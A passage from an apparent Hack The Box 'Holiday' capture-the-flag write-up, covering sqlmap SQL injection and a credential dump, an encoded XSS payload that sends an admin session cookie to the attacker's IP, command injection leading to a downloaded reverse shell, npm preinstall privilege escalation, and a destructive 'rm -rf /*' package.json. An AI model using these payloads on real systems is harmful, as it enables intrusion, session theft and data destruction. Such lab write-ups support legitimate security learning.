(_||| _) (/_(_|| (_| )

Extensions: php, html, txt, css, js, xml | HTTP method: get | Threads: 10 | Wordlist size: 959

Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-04-27_16-29-33.log

Target: 10.10.10.25:8000

[16:29:33] Starting: 
[16:29:33] 302 -   28B  - /Admin  -&amp;gt;  /login
[16:29:33] 302 -   28B  - /admin  -&amp;gt;  /login
[16:29:33] 302 -   28B  - /agent  -&amp;gt;  /login
[16:29:34] 301 -  165B  - /css  -&amp;gt;  /css/
[16:29:35] 301 -  165B  - /img  -&amp;gt;  /img/
[16:29:35] 301 -  163B  - /js  -&amp;gt;  /js/
[16:29:36] 302 -   28B  - /logout  -&amp;gt;  /login
[16:29:36] 200 -    1KB - /login
                                         
Task Completed 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here we are! We got an admin login page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sql-injection-through-post-parameters&quot;&gt;SQL injection through POST parameters&lt;/h2&gt;

&lt;p&gt;Unfortunately we don’t have the credentials to login, but, if we set our FoxyProxy to 8080 and we intercept a request to login from the /admin page through Burpsuite, we can send the request to sqlmap trying to inject some queries to retrieve the database content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; sqlmap -r sql.txt -p username --batch --level=3 --risk=3 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [&quot;]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:35:37 /2020-04-27/

[16:35:37] [INFO] parsing HTTP request from 'sql.txt'
[16:35:37] [INFO] testing connection to the target URL
[16:35:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:35:37] [INFO] testing if the target URL content is stable
[16:35:37] [INFO] target URL content is stable
[16:35:37] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[16:35:38] [INFO] testing for SQL injection on POST parameter 'username'
[16:35:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:35:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:35:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:35:44] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string=&quot;Invalid User&quot;)
[16:35:44] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'H2' 
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 228 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin&quot;) OR NOT 4022=4022 AND (&quot;Fset&quot;=&quot;Fset&amp;amp;password=admin
---

[16:35:52] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing! It worked! This happens because the parameters that pass the data to the back-end are not properly sanitized, since the concatenated queries allow the user input to be inserted. Now let’s extract the data from the database.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; sqlmap -r sql.txt -p username --batch --level=3 --risk=3 --dbs --dump
        ___
       __H__                                                                                                                                                   
 ___ ___[)]_____ ___ ___  {1.3.11#stable}                                                                                                                      
|_ -| . [.]     | .'| . |                                                                                                                                      
|___|_  [,]_|_|_|__,|  _|                                                                                                                                      
      |_|V...       |_|   http://sqlmap.org                                                                                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:07:51 /2020-04-27/

[17:07:51] [INFO] parsing HTTP request from 'sql.txt'
[17:07:52] [INFO] resuming back-end DBMS 'sqlite' 
[17:07:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin&quot;) OR NOT 4022=4022 AND (&quot;Fset&quot;=&quot;Fset&amp;amp;password=admin
---
[17:07:52] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite

[17:12:30] [INFO] fetching entries for table 'notes' in database 'SQLite_masterdb'
[17:12:30] [INFO] fetching number of entries for table 'notes' in database 'SQLite_masterdb'
[17:13:58] [INFO] retrieved: 1
[17:13:58] [INFO] retrieved: 1
[17:13:59] [INFO] retrieved: 1
[17:14:00] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
[17:14:24] [INFO] retrieved: RickA
[17:14:28] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[17:14:28] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
&amp;gt; 1
[17:14:28] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[17:14:28] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[17:14:28] [INFO] starting 2 processes 
[17:14:43] [WARNING] no clear password(s) found                                                                                                               
Database: SQLite_masterdb
Table: users
[1 entry]
+----+--------+----------+----------------------------------+
| id | active | username | password                         |
+----+--------+----------+----------------------------------+
| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
+----+--------+----------+----------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally we retrieve an username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RickA&lt;/code&gt; and a MD5 password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fdc8cd4cff2c19e0d1022e78481ddf36&lt;/code&gt;, that making a search on google we can decrypt with md5hashing.net.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;login-with-credentials&quot;&gt;LOGIN with credentials&lt;/h2&gt;

&lt;p&gt;After the login we are redirected to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/agent&lt;/code&gt; which seems to be a management booking portal with agents credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By clicking on a random section, we can see some informations relative to the agent section:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And by consulting the notes option, we can assume there is some script going on the background that goes to a page and approve something.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cross-site-scripting-xss&quot;&gt;Cross-site scripting (XSS)&lt;/h2&gt;

&lt;p&gt;The message came from notes section makes me think I might be able to use javascript code to perform an XSS over an administrator account. Let’s test if I inject a ping command into an image tag, if it comes back:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=http://10.10.14.27:8000 /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.25 - - [27/Apr/2020 20:26:55] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got a ping back! But, I if try to use an HTML tag like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; the ping didn’t come back. That’s happens because the server sanitizes any HTML tags except for images tags. Fortunately we can bypass this filter, wrapping the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inside the img tag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=/&amp;gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that I was able to inject a script tag, the question became how I could use this to inject a javascript payload while bypassing any escaping. Using a combination of eval and String.fromCharCode I was able to inject an arbitrary javascript payload that would be executed as the administrator, using the following HTML as a wrapper.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(... payload ...))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And this as the payload.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.write('&amp;lt;script src=&quot;http://10.10.14.27:8000&quot;&amp;gt;&amp;lt;/script&amp;gt;');
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s charcode encode this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 39, 60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62, 39, 41, 59
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once encoded, let’s place it in the XSS wrapper.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 39, 60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62, 39, 41, 59))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.25 - - [27/Apr/2020 21:13:57] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once again i got the ping back from the administrator, so, now it’s time to grub the session cookie from him:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;window.addEventListener('DOMContentLoaded', function(e) {
  window.location = &quot;http://10.10.14.27:8000/?cookie=&quot; + encodeURI(document.getElementsByName(&quot;cookie&quot;)[0].value)
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s encode it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;119, 105, 110, 100, 111, 119, 46, 97, 100, 100, 69, 118, 101, 110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 40, 39, 68, 79, 77, 67, 111, 110, 116, 101, 110, 116, 76, 111, 97, 100, 101, 100, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 32, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 47, 63, 99, 111, 111, 107, 105, 101, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 99, 111, 111, 107, 105, 101, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 41, 32, 125, 41
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And replace:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(119, 105, 110, 100, 111, 119, 46, 97, 100, 100, 69, 118, 101, 110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 40, 39, 68, 79, 77, 67, 111, 110, 116, 101, 110, 116, 76, 111, 97, 100, 101, 100, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 32, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 47, 63, 99, 111, 111, 107, 105, 101, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 99, 111, 111, 107, 105, 101, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 41, 32, 125, 41))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally I got a ping back with the administrator session cookie:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 42920
GET /?cookie=connect.sid=s%253A3ac3a270-88b1-11ea-b152-3b1ed3b3d691.AtGD5UtDV%252Fv7XlfBQ9MEfehRLtokvHHNXBFeEpD9%252FTA HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.14.27:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The cookie is url encoded, so we need first to decode it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then update in Firefox dev tools:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An admin section is appeared!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;from-admin-to-reverse-shell&quot;&gt;From Admin to Reverse Shell&lt;/h2&gt;

&lt;p&gt;With this admin cookie I also gain access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.25:8000/admin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hitting the button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bookings&lt;/code&gt; we can download a file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But intercepting the request during the request to download the file, we can see something really interesting:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /admin/export?table=bookings HTTP/1.1
Host: 10.10.10.25:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.25:8000/admin
Connection: close
Cookie: connect.sid=s%3A3ac3a270-88b1-11ea-b152-3b1ed3b3d691.AtGD5UtDV%2Fv7XlfBQ9MEfehRLtokvHHNXBFeEpD9%2FTA
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The list of allowed characters is interesting. Why allow “&amp;amp;” and “/”? This makes me think that this might be a command injection vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s working! Now we have to obtain a reverse shell. But first I need to know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;who am I&lt;/code&gt;, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; is installed and if i can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write&lt;/code&gt; to the current directory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we can write on the current directory and we can use wget on the remote machine, I’ll create a file with a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But how can we download something from an ip address if only [a-z0–9&amp;amp;\s\/] is allowed? The key hear is to remember that ip address are just 32 bit numbers, and most tools can take a number of different formats, including hexadecimal. Let’s go on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miniwebtool.com/ip-adress-to-hex-convert/&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0A0A0E1B
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we have to set the letters of our hexadecimal IP for case sensitive and download the reverse to the remote machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.25 - - [28/Apr/2020 00:19:48] &quot;GET /reverse HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Give the permissions to the reverse:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then exec it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 46466
bash: cannot set terminal process group (1137): Inappropriate ioctl for device
bash: no job control in this shell
algernon@holiday:~/app$ id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; cat /home/algernon/user.txt
id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; cat /home/algernon/user.txt
uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
/home/algernon/app
5edc176c52673a6e0f087c68c531c743
algernon@holiday:~/app$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to root&lt;/h2&gt;

&lt;p&gt;The first thing i checked was the sudo rights with algernon&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ 

algernon@holiday:~/app$ sudo -l
sudo -l
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, algernon was able to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/npm i&lt;/code&gt; without a password, and I already knew that npm install had the ability to run preinstall scripts. So, we can generated a json package:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
  &quot;scripts&quot;: { &quot;preinstall&quot;: &quot;cat /root/root.txt&quot; }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~$ sudo /usr/bin/npm i --unsafe-perm
sudo /usr/bin/npm i --unsafe-perm

&amp;gt; undefined preinstall /home/algernon
&amp;gt; cat /root/root.txt

a844cb50bf88ebbe8412e095a6b642e8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;shell-as-root&quot;&gt;Shell as root&lt;/h2&gt;

&lt;p&gt;Accorging with this link &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/joaojeronimo/rimrafall&lt;/code&gt; we can run dangerous commands from a package.json with npm.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimrafall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -rf /*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;preinstall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -rf /* /.*&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
